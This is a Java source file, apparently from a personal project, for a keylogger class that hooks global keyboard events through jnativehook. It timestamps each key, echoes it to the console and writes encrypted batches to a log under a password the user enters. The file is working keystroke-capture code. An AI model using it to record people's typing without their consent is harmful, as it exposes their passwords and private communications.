package com.github.giorgosg1an;

import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

/**
 * KeyLogger is a class that implements the NativeKeyListener interface to capture and log keyboard events.
 * It buffers key press events, encrypts them, and writes them to a secure log using the EncryptedLogger.
 * The buffer is flushed to the encrypted log after a specified threshold of key events.
 * 
 * <p>
 * Features:
 * <ul>
 *   <li>Captures native key press events and logs them with a timestamp.</li>
 *   <li>Encrypts and writes logs using a user-provided password.</li>
 *   <li>Flushes the buffer to the encrypted log after a configurable number of key events.</li>
 *   <li>Gracefully exits and flushes remaining logs when the ESC key is pressed.</li>
 * </ul>
 * </p>
 * 
 * @author Giannopoulos Georgios
 */
public class KeyLogger implements NativeKeyListener{

    private static final int FLUSH_THRESHOLD = 20;
    private final List<String> buffer = new ArrayList<>();
    private final EncryptedLogger logger;
    

    /**
     * Constructs a new KeyLogger instance.
     * <p>
     * Prompts the user to enter an encryption password using a dialog box,
     * then initializes the {@link EncryptedLogger} with the provided password.
     */
    public KeyLogger() {
        EncryptedLogger tmp = null;
        try {
            String password = JOptionPane.showInputDialog(null, "Enter encryption password: ");
            tmp = new EncryptedLogger(password.toCharArray());
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }

        this.logger = tmp;
    }
    /**
     * Handles native key press events. Records the key press with a timestamp,
     * adds the entry to a buffer, and flushes the buffer to storage when a threshold is reached.
     * If the Escape key is pressed, flushes the buffer, unregisters the native hook,
     * and exits the application.
     *
     * @param e the native key event triggered by a key press
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String timestamp = TimestampUtil.now();
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        String entry = "[" + timestamp + "] Key: " + keyText;
        buffer.add(entry);
        System.out.println(entry);

        if (buffer.size() >= FLUSH_THRESHOLD) {
            flushBuffer();
        }

        // Exit on ESC Key
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            flushBuffer();
            System.out.println("Exiting keylogger.");

            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                System.out.println(ex.getMessage());
            }
            System.exit(0);
        }
    }

    /**
     * Flushes the current buffer by concatenating its contents into a single string,
     * encrypting, and writing the result using the logger. Clears the buffer after
     * successful write. If the buffer is empty, the method returns immediately.
     * Any exceptions during the process are caught and printed to the standard error stream.
     */
    private void flushBuffer() {
        if (buffer.isEmpty()) {
            return;
        }

        try {
            String fullLog = String.join("\n", buffer);
            logger.encryptAndWrite(fullLog);
            buffer.clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
